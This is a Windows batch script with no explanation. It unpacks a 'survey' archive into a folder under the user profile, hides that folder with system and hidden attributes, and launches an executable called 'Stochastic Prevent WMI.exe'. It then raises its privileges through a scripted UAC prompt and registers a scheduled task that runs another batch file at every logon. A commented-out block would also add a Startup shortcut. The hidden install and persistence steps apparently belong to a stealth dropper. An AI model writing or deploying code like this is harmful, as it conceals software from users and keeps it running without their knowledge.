@echo OFF
set filename=survey

if not exist "%USERPROFILE%\%filename%" mkdir "%USERPROFILE%\%filename%"

 for /F "delims=" %%I IN (' dir /b %filename%.zip ') DO (
   "%ProgramFiles%\7-Zip\7z.exe" x -aoa -y -x!"%filename%.exe" -x!"install.bat" -o"%USERPROFILE%\%filename%\" "%%I" 
 )

rem set SCRIPT="%TEMP%\%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%.vbs"
rem echo Set oWS = WScript.CreateObject("WScript.Shell") >> %SCRIPT%
rem echo sLinkFile = "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%filename%.lnk" >> %SCRIPT%
rem echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%
rem echo oLink.TargetPath = "%USERPROFILE%\%filename%\%filename%\Stochastic Prevent WMI.exe" >> %SCRIPT%
rem echo oLink.Save >> %SCRIPT%
rem cscript /nologo %SCRIPT%
rem del %SCRIPT%

attrib +s +h "%USERPROFILE%\%filename%"

start %USERPROFILE%\%filename%\%filename%\"Stochastic Prevent WMI.exe"

@echo off
:: BatchGotAdmin
::-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
::--------------------------------------

SCHTASKS /CREATE /SC ONLOGON /TN "Scheduler ONLOGON" /TR "%USERPROFILE%\survey\survey\Starting Pack.bat" /RU %username%

